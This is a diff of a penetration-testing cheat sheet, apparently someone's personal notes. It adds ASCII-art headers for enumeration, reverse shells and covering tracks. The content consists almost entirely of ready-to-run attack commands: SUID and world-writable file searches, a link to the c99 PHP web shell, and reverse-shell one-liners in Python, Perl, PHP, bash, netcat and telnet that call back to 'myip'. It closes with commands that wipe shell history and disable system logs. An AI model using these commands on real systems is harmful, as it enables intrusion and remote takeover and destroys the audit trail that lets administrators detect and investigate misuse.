@@ -1,29 +1,48 @@
-#suid programs
+____ _  _ _  _ _  _ ____ ____ ____ ___ _ ____ _  _ 
+|___ |\ | |  | |\/| |___ |__/ |__|  |  | |  | |\ | 
+|___ | \| |__| |  | |___ |  \ |  |  |  | |__| | \|
+
+#list suid programs
 find / -type f \( -perm -4000 -o -perm -2000 \) -exec ls -lg {} \; 2>/dev/null >suidfiles.txt
 
 #list suid programs owned by root
 find / -type f  -user root \( -perm -4000 -o -perm -2000 \) -exec ls -lg {} \; 2>/dev/null >suidfiles.txt
 
-#find world writeable files in /etc
+#list world writeable files in /etc
 find /etc/ -type f -perm -o=w
 
-#find world writeable files in /var
+#list world writeable files in /var
 find /var/ -type f -perm -o=w
 
-#find log files you can read
+#list log files that are world readable
 find /var/log/ -type f -perm -o=r
+____ ____ _  _ ____ ____ ____ ____    ____ _  _ ____ _    _    ____ 
+|__/ |___ |  | |___ |__/ [__  |___    [__  |__| |___ |    |    [__  
+|  \ |___  \/  |___ |  \ ___] |___    ___] |  | |___ |___ |___ ___]
 
-#Reverse Shell with NetCat
+#netcat listener
+nc -nvlp 1234
+
+#c99
+https://github.com/tennc/webshell/blob/master/php/PHPshell/c99/c99.php
+
+#python reverse shell
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("myip",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+#perl reverse shell
+erl -e 'use Socket;$i="myip";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+#php reverse shell
+php -r '$sock=fsockopen("myip",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+#basic netcat reverse shell
 nc -c /bin/bash <myip> 1234
 
-#Unix-ish nc that does support the -c flag
+#Unix-ish BSD style netcat that does support the -c flag
 /bin/sh -i 2>&1 | nc myip 1234
 
-#You could even pipe BASH through netcat.
+#pipe BASH through netcat
 /bin/bash | nc <myip> 1234
-
-#Then listen for the shell:
-nc -nvlp 1234
 
 #Reverse Shell w/o NetCat
 /bin/bash -i > /dev/tcp/myip/1234 0<&1 2>&1
@@ -35,15 +54,22 @@ exec 5<>/dev/tcp/myip/1234; cat <&5 | while read line; do $line 2>&5 >&5; done
 #if it already exists, it will probably fail to throw the shell
 mknod backpipe p && telnet myip 1234 0<backpipe | /bin/bash 1>backpipe
 
-#get a tty from within a reverse shell
-python -c 'import pty; pty.spawn("/bin/sh")'
-
 #even crazier
 #listen on port 1234 and 12345
 telnet myip 1234 | /bin/bash | telnet myip 12345
 #issue commands in 1234 shell and get response in 12345 shell
 
+#get a tty from within a reverse shell
+python -c 'import pty; pty.spawn("/bin/sh")'
+
+____ ____ _  _ ____ ____    ___ ____ ____ ____ _  _ ____ 
+|    |  | |  | |___ |__/     |  |__/ |__| |    |_/  [__  
+|___ |__|  \/  |___ |  \     |  |  \ |  | |___ | \_ ___]
+
 #disable logging before issuing commands
 chmod 0 ~/.bash_history
+#or
+rm ~/.bash_history;ln -s /dev/null ~/.bash_history
+
 #if root
 chmod -R 0 /var/log/*
